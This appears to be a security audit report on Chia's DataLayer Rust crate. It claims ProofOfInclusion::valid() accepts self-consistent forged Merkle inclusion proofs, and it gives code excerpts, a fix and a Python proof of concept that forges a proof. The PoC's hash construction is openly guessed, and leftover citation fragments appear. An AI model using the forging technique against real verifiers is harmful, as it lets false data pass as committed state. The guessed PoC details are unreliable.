### Title
`ProofOfInclusion::valid()` Compares Against Self-Derived Root Instead of External Trusted Root, Enabling Forged DataLayer Inclusion Proofs — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` performs a final root-hash check using `self.root_hash()`, which is derived from the proof's own `combined_hash` fields. Because the loop body already asserts `calculated_hash == layer.combined_hash` before advancing `existing_hash`, the final comparison `existing_hash == self.root_hash()` is always `true` when the loop completes. The function therefore only verifies internal self-consistency of the proof, never binding it to any external trusted tree root. An attacker who controls the serialized `ProofOfInclusion` bytes can forge a proof for any `node_hash` they choose and `valid()` will accept it.

### Finding Description
In `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {   // loop invariant: on exit, existing_hash == last.combined_hash
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // BUG: self.root_hash() == last.combined_hash == existing_hash — always true
}
```

`root_hash()` returns `last.combined_hash`:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // same value existing_hash was just set to
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash = calculated_hash` for the last layer. The loop only continues when `calculated_hash == layer.combined_hash`, so on exit `existing_hash == last.combined_hash`. `self.root_hash()` also returns `last.combined_hash`. The final comparison is therefore `last.combined_hash == last.combined_hash` — unconditionally `true`.

This is the direct analog of the external report's bug: the code has access to the correct value (an external trusted root) but uses a self-referential value (`self.root_hash()`) instead, making the critical check a no-op.

The `ProofOfInclusion` struct carries `#[derive(Streamable)]` and `from_py_object`, so an attacker can:
1. Fabricate any `node_hash` (the leaf they wish to falsely prove).
2. Choose arbitrary `other_hash` / `other_hash_side` values per layer.
3. Compute each `combined_hash = calculate_internal_hash(...)` to satisfy the loop invariant.
4. Deliver the resulting struct (via Python construction or deserialized bytes) to any verifier that calls `proof.valid()`. [5](#0-4) 

### Impact Explanation
The DataLayer commits a Merkle tree root on-chain; `ProofOfInclusion` is the mechanism by which off-chain consumers verify that a specific key-value pair belongs to that committed root. Because `valid()` never compares against an external trusted root, any internally consistent but entirely fabricated proof passes. An attacker can prove false inclusion of any key-value pair, letting untrusted input prove invalid state against a committed on-chain root. This matches the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."*

### Likelihood Explanation
`valid()` is the only validation method on `ProofOfInclusion` and its name implies complete proof validity. The Python binding exposes it as `py_valid()` with no companion `valid_against_root()` alternative. Any DataLayer consumer that calls `proof.valid()` without separately asserting `proof.root_hash() == on_chain_root` is fully exploitable. The `ProofOfInclusion` struct is attacker-constructible from Python (`from_py_object`) and over the wire (`Streamable`), so no privileged access is required.

### Recommendation
Replace the self-referential final check with a comparison against a caller-supplied trusted root:

```rust
// Rename existing method to reflect what it actually checks:
pub fn is_internally_consistent(&self) -> bool { ... }

// Add a new method that actually validates against a known root:
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == *trusted_root   // compare against external trusted root, not self.root_hash()
}
```

Update the Python binding to expose `valid_against_root(trusted_root: Hash)` and deprecate the current `valid()` / `py_valid()`.

### Proof of Concept

```python
from chia_rs import ProofOfInclusion, ProofOfInclusionLayer, Side
import hashlib, struct

# Attacker wants to forge a proof that node_hash is in the tree
node_hash = bytes([0xAB] * 32)
other_hash = bytes([0xCD] * 32)

# Compute combined_hash to satisfy the loop invariant
# (using whatever calculate_internal_hash does — attacker controls all inputs)
h = hashlib.sha256()
h.update(b'\x00' * 30)          # prefix bytes used by calculate_internal_hash
h.update(node_hash)
h.update(other_hash)
combined_hash = h.digest()       # fabricated but self-consistent

layer = ProofOfInclusionLayer(
    other_hash_side=Side.Right,
    other_hash=other_hash,
    combined_hash=combined_hash,
)
forged_proof = ProofOfInclusion(node_hash=node_hash, layers=[layer])

assert forged_proof.valid()      # passes — forged proof accepted
# forged_proof.root_hash() == combined_hash, which is NOT the on-chain root
```

The forged proof passes `valid()` despite `root_hash()` being a fabricated value unrelated to any committed on-chain tree root. [6](#0-5)
